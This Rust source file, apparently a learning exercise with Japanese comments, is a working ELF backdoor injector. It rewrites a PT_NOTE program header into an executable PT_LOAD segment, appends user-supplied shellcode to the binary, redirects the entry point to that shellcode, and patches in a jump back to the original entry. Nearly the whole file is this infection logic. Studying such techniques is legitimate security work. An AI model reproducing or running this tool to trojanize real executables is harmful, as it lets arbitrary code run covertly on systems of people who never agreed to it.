use mental_elf::utils::{Result, StringError};
use mental_elf::elf64::constants::*;
use std::{env, fs, process};
use std::io::prelude::*;
use std::io::SeekFrom;

fn main() -> Result<()> {
    // 引数を取る
    let args = parse_args().unwrap_or_else(|err| {
        eprintln!("{}", err);
        process::exit(1);
    });

    // パッチ対象のELFファイルを開く
    let mut elf_fd = fs::OpenOptions::new()
        .read(true).write(true).open(&args.elf_path)?;

    // シェルコードをファイルから読み込む
    let mut shellcode: Vec<u8> = vec![];
    let mut sc_fd = fs::File::open(args.sc_path)?;
    sc_fd.read_to_end(&mut shellcode)?;

    let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;

    // これら、どうせfdを渡すならread_program_headersの関数内で取得できそうじゃない？
    let phdr_offset = elf_header.e_phoff;
    let phdr_num = elf_header.e_phnum;

    let mut program_headers = mental_elf::read_elf64_program_headers(
        &mut elf_fd, phdr_offset, phdr_num)?;

    // シェルコードの処理が終わったら本来のエントリポイントに戻るようにパッチする
    patch_jump(&mut shellcode, elf_header.e_entry);

    // バックドアの様々な情報をまとめる
    let file_len = elf_fd.metadata()?.len();
    let bd = Backdoor {
        shellcode,
        file_offset: file_len,
        memory_offset: 0xc00000000 + file_len,
    };

    // PT_NOTEセクションをパッチしてファイル末尾に追加していくシェルコードを読み込ませる
    for phdr in &mut program_headers {
        if phdr.p_type == PT_NOTE {
            println!("Found PT_NOTE; Changing to PT_LOAD");
            phdr.p_type = PT_LOAD;
            phdr.p_flags = PF_R | PF_X;
            phdr.p_vaddr = bd.memory_offset;
            phdr.p_memsz += bd.shellcode.len() as u64;
            phdr.p_filesz += bd.shellcode.len() as u64;
            phdr.p_offset = bd.file_offset;
            break;
        }
    }

    // ProgramHeaderの変更を書き込む
    mental_elf::write_elf64_program_headers(
        &mut elf_fd, phdr_offset, phdr_num, program_headers
    )?;

    elf_header.e_entry = bd.memory_offset;
    mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;

    // シェルコードをファイル末尾に追加する
    elf_fd.seek(SeekFrom::End(0))?;
    elf_fd.write(&bd.shellcode)?;

    Ok(())
}

struct Arguments {
    elf_path: String,
    sc_path: String,
}

fn parse_args() -> Result<Arguments> {
    let args: Vec<String> = env::args().collect();

    if args.len() != 3 {
        return Err(StringError::boxed(
            &format!("Usage: {} <ELF File> <Shellcode File>", args[0])
        ));
    }

    Ok(Arguments { 
        elf_path: args[1].clone(), 
        sc_path: args[2].clone(),
    })
}

struct Backdoor {
    shellcode: Vec<u8>,
    file_offset: u64,
    memory_offset: u64,
}

fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
    shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
    shellcode.extend_from_slice(&entry_point.to_ne_bytes());
    shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
}